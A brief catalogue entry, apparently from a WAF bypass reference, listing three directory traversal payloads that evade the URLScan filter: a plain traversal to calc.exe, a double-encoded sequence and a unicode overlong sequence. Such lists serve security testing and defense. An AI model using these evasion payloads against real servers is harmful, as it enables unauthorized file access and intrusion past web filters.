---
id: WAF-BYPASS-012
title: URLScan WAF Bypass Payloads
category: Known Bypasses
severity_range: Medium-Critical
---

# URLScan WAF Bypass Payloads

## Directory Traversal

1. `../../../Windows/System32/calc.exe` with URL encoding
2. `..%252f..%252f..%252f` (double encoding)
3. `..%c0%af..%c0%af` (unicode overlong)
